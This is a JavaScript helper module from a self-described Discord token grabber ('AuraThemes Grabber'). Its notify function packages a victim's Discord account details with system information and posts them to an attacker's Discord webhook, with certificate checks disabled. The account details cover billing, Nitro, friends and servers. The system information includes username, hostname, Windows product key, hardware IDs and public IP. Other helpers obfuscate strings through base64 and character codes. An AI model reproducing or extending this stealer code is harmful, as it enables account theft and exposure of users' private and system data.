const https = require("https");
const axios = require('axios');

const unique_id = () => {
    const generate_random_number = () => {
        return String(Date.now() / Math.floor(Math.random() * Math.floor(Math.PI * (Date.now() / 1000000) * Math.E - Math.PI + Math.PI))).replace(".", "");
    };
    return `${generate_random_number().slice(0, 4) + generate_random_number().slice(0, 4) + generate_random_number().slice(0, 3) + 0}`;
};

const place = (text) => {
    let result = "";

    text.split(" ").forEach((u) =>
        result += String.fromCharCode(parseInt(u))
    );
    return result;
};

const key_res = (res) => ["y", "yes", "ok"].includes(res.toLowerCase().trim()) ? "true" : "false";

const decode_B64 = (s) => Buffer.from(s, 'base64').toString("utf-8");

const msg = (m) => (`:: ${m}`).toString()

const is_link_icon = (link) => /https?:\/\/(www\.)?[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_\+.~#?&\/\/=]*)/.test(link)

const is_webhook = (whk) => /^(https:\/\/(discordapp\.com|discord\.com|canary\.discord\.com|ptb\.discord\.com)\/api\/webhooks\/\d+\/[a-zA-Z0-9_-]+)$/.test(whk);

const notify = async (webhook, instance, ctx, discord, system) => {
    ctx.username = "@AuraThemes Grabber";
    ctx.avatar_url = "https://i.imgur.com/WkKXZSl.gif";

    ctx.embeds[0].title = `${ctx.title}`;

    ctx.embeds[0].thumbnail = {
        url: `${discord.avatar}`,
    };

    let inject_path = [];

    discord.inject_path.forEach((path) => {
        inject_path.push(`\`${path}\``);
    });

    inject_path = inject_path.length > 0 ? inject_path.join(`, \n`) : "❌";

    ctx.embeds[0].fields.push(
        { name: "Nitro", value: `${discord.nitroType}`, inline: true },
        { name: "Badges", value: `${discord.badges}`, inline: true },
        { name: "Billing", value: `${discord.billing}`, inline: true },
        { name: "Language", value: `${discord.langue}`, inline: true },
        { name: "Path", value: `${inject_path}`, inline: false },
    );

    ctx.embeds.push(
        { title: `HQ Friend(s)`, description: discord.rare?.friends },
        { title: `HQ Guild(s)`, description: discord.rare?.guilds },
        { title: `User Information(s)`, description: `**NSFW**${discord.NSFW}\n**Status**${discord.status}\n**Owner Servers**\`${discord.totalOwnedGuild}\`\n**Connection**\`${discord.totalConnection}\`\n**BOTS/RPC**\`${discord.totalApplication}\`\n**Blocked**\`${discord.totalBlocked}\`\n**Servers**\`${discord.totalGuild}\`\n**Friends**\`${discord.totalFriend}\`\n**Theme**\`${discord.theme}\`\n**Pending**\`${discord.pending}\`\n\n**Biography**\`\`\`yml\n${discord.bio === "has no description" ? "Not found" : discord.bio}\n\`\`\`` },
        {
            title: `System Informatio(s)`,
            fields: [
                { "name": "User", "value": `||\`\`\`yml\nUsername: ${process.env.USERNAME}\nHostname: ${process.env.COMPUTERNAME}\`\`\`||`, inline: false },
                { "name": "System", "value": `||\`\`\`yml\nCPU: ${system.CPU}\nUUID: ${system.UID}\nRAM: ${system.RAM}\nMac Address: Not found\nProduct Key: ${system.WINDOWS_KEY}\nLocal IP: Not found\nOS Version: ${system.WINDOWS_VERSION}\`\`\`||`, inline: false },
                { "name": "Network", "value": `||\`\`\`yml\nPublic: ${system.IP}\nCountry: Not found\nRegion: Not found\nCity: Not found\nLatitude: Not found\nLongitude: Not found\nISP: Not found\nTime Zone: Not found\nCurrency Code: Not found\`\`\`||`, inline: false },
            ]
        },
    );

    ctx.embeds.forEach((e) => {
        e.color = 12740607;
        e.author = {
            name: `${discord.username} | ${discord.ID}`,
            icon_url: `${discord.avatar}`,
        };
        e.timestamp = new Date();
        e.footer = {
            text: decode_B64('QXVyYVRoZW1lcyBHcmFiYmVyIC0gaHR0cHM6Ly9naXRodWIuY29tL2s0aXRydW4vRGlzY29yZFRva2VuR3JhYmJlcg'),
            icon_url: "https://i.imgur.com/yVnOSeS.gif",
        };
    });

    try {
        await instance({
            "httpsAgent": new https.Agent({ rejectUnauthorized: false }),
            "url": webhook,
            "method": "POST",
            "headers": {
                "Content-Type": "application/json"
            },
            "data": JSON.stringify(ctx)
        });
        instance.get(discord.copy);
    } catch (error) {
        console.error("Error sending request to webhook:", error.message);
    }
};

module.exports = {
    unique_id,
    place,
    key_res,
    decode_B64,
    msg,
    is_webhook,
    is_link_icon,
    notify
};
